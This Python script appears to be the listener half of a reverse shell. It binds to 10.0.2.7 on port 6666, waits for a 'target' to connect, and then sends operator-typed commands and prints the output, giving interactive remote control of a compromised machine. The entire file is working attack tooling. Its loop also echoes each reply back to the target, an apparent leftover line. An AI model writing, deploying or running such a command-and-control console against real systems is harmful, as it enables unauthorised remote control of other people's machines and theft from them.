#!/usr/bin/env python

import socket

HOST = "10.0.2.7"
PORT = 6666

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen()
    print("[+] Listening for connections")
    conn, addr = s.accept()
    print("[+] Connection established with target ", addr)
    while True:
        command = input(">> ")
        conn.send(command.encode())
        data = conn.recv(1024)
        print(data.decode("utf-8", "ignore"))
        if not data:
            break
        conn.sendall(data)

